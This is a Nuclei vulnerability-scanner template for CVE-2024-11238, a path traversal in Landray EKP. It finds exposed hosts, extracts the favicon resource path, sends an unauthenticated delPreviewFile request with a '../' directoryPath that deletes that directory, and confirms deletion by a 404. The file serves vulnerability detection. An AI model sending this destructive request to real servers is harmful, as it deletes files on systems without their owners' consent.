id: CVE-2024-11238

info:
  name: Landray EKP - Path Traversal
  author: theamanrawat
  severity: medium
  description: |
    Landray EKP contains a path traversal caused by manipulation of the 'directoryPath' argument in /sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile, letting remote attackers access arbitrary files, exploit requires no authentication.
  impact: |
    Remote attackers can access arbitrary files on the server, potentially leading to information disclosure or system compromise.
  remediation: |
    Update to the latest version that addresses this vulnerability or apply appropriate patches.
  reference:
    - https://github.com/CoinIsMoney/TempGuide/blob/main/LL-exp-02.pdf
    - https://nvd.nist.gov/vuln/detail/CVE-2024-11238
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N
    cvss-score: 6.9
    cve-id: CVE-2024-11238
  metadata:
    verified: true
    vendor: landray
    product: landray_ekp
    shodan-query:
      - 'http.favicon.hash:831854882'
  tags: cve,cve2024,directory,traveral,intrusive

flow: http(1) && http(2) && http(3) && http(4)

http:
  - raw:
      - |
        GET /login.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en-US,en;q=0.9
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
        internal: true

    extractors:
      - type: regex
        part: body
        name: faviconPath
        internal: true
        group: 1
        regex:
          - 'href="/resource/(.*?)/favicon.ico"'

  - raw:
      - |
        GET /resource/{{faviconPath}}/favicon.ico HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
        internal: true

  - raw:
      - |
        GET /sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile&directoryPath=../{{faviconPath}}/ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - content_length == 0
        condition: and
        internal: true

  - raw:
      - |
        GET /resource/{{faviconPath}}/favicon.ico HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 404
